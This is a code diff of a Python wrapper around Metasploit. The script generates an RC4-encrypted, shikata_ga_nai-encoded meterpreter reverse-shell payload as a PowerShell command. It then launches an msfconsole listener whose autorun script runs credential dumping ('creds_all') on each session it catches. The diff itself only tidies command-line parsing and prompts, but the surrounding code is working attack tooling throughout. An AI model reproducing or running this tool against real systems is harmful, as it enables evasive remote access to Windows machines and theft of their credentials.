@@ -22,7 +22,6 @@ def get_internal_address():
 	return s.getsockname()[0]
 
 def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
-	#Add try expect statment for the msfpro alternate path
 	rc4 = os.system('msfvenom -p windows/meterpreter/'+msfPayload+ ' -e x86/shikata_ga_nai RC4PASSWORD='+rc4Password+' LHOST='+lhost+' LPORT='+lport+' -f psh-cmd -o ' +filePowershell)
 	with open(filePowershell, 'r+') as f1:
 		rc4Payload = f1.read()
@@ -56,7 +55,6 @@ def autorunscript():
 				 "creds_all")
 
 def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice): 
-	#Creates resource file(with autorunscripts builtin) and launches listener.
 	on = set(['on','yes', 'ye', ''])
 	off = set(['off','of','no'])
 	if msflistenerChoice in on:
@@ -67,7 +65,7 @@ def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice):
 					"set LPORT "+lport+"\n"+\
 					"set Rc4PASSWORD "+rc4Password+""+"\n"+\
 					"set ExitOnSession false"+"\n"+\
-					"set AutoRunScript multi_console_command -rc"+fileAutoscript+"\n"+\
+					"set AutoRunScript multi_console_command -rc "+fileAutoscript+"\n"+\
 					"exploit -j -z")
 		os.system('msfconsole -q -r '+filerc4listener)
 	elif msflistenerChoice in off:
@@ -108,43 +106,42 @@ def main(argv):
     	
     	print('TIP: Verbosity [ON] will print payload to STDOUT.')
     	print('TIP: Verbosity [OFF] will copy payload to Clipboard.')
-    	verbose = raw_input('Verbosity[OFF]:') or 'OFF'
+    	verbose = raw_input('Verbosity[OFF/on]:') or 'OFF'
     	verboseChoice = verbose.lower()
     	print('ENTERED: "%s"' % verboseChoice.upper() + '\n')
     	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
 
     	print('TIP: Listener [ON] will automagically launch a MSF listener.')
-    	msfListener = raw_input('listener[ON]:') or 'ON'
+    	msfListener = raw_input('listener[ON/off]:') or 'ON'
     	msflistenerChoice = msfListener.lower()
     	print('ENTERED: "%s"' % msflistenerChoice.upper() + '\n')
     	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
 
     else:
     	try:
-        	opts, args = getopt.getopt(argv, 'l:p:r:v:e:h',['lhost=','lport=','rc4Password=','verbose=','listener=','help'])
+        	opts, args = getopt.getopt(argv, 'lhost:lport:rc4pass:verbose:listener:help',['lhost=','lport=','rc4Password=','verbose=','listener=','help'])
             #GETOPT Menu: 
         	for opt, arg in opts:
         		if opt in ('--help'):
         			help()
         			sys.exit(2)
-        		elif opt in ('-h', '--lhost'):
+        		elif opt in ('--lhost'):
         			lhost = arg
-        		elif opt in ('-p', '--lport'):
+        		elif opt in ('--lport'):
         			lport = arg
-        		elif opt in ('-r', '--rc4Password'):
+        		elif opt in ('--rc4Password'):
         			rc4Password = arg
-        		elif opt in ('-v', '--verbose'):
+        		elif opt in ('--verbose'):
         			verboseChoice = arg
-        		#Executes listener
-        		elif opt in ('-e','--listener'): 
-        			if arg == "on":
-        				payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
-        				listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
+        		elif opt in ('--listener'): 
+        			msflistenerChoice = arg
         		else:
         			help()
         			sys.exit(2)
         	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
         	autorunscript()
+        	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
+
     	
     	except getopt.GetoptError:
         	help()
